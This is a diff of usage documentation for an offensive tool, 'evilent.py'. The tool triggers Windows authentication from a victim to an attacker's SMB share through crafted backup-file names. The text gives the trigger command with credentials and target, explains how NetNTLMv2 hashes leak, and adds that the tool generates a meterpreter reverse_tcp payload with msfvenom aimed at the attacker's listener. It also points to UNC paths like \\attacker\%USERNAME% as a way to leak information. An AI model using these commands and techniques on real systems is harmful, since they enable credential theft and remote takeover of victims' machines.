@@ -50,9 +50,8 @@ Step 2: Trigger the attack
 
 In another terminal:
 
-python3 evilent.py -backupfile <Sharename>\\<filename> \
-  <domain>/<username>:<password>@<target> \
-  <listener>
+python3 evilent.py -backupfile Sharename\\filename \
+  domain/username:password@target listener
 
     target: The victim machine (can be given as [domain/]username[:password]@<ip>)
 
@@ -69,6 +68,8 @@ python3 evilent.py -backupfile <Sharename>\\<filename> \
     Authentication often comes from NT AUTHORITY\LOCAL SERVICE, but antivirus activity may cause the host machine account to leak NetNTLMv2.
 
     Exploitable file name variations (e.g., test.exeem䵌䵅P) must be prepared ahead on the SMB share.
+
+    Evilent.py generate exe file with MSFVenom (msfvenom -p windows/meterpreter/reverse_tcp LHOST={listen_ip} LPORT=4444 -f exe -o {name})
 
     Environment variables like %USERNAME% may be expanded when referenced in UNC paths (e.g., \\attacker\%USERNAME%) — potential info leak.
 
